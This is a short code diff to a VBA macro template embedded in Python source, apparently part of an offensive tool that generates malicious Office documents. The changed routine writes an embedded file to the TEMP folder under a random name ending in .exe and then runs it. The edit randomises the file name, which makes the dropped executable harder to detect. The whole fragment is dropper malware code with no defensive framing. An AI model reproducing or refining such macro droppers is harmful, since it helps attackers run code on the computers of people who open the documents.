@@ -346,9 +346,10 @@ r"""
 
 Private Sub executeEmbed()
     Dim fileName As String
-    fileName = "\<<<FILE_NAME>>>"
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    fileName = Replace(fso.GetTempName,".tmp",".exe")
     Dim fullPath As String
-    fullPath = Environ("TEMP") & fileName
+    fullPath = Environ("TEMP") & "/" & fileName
     DumpFile fullPath
     ExecuteCmdAsync fullPath <<<PARAMETERS>>>
 End Sub
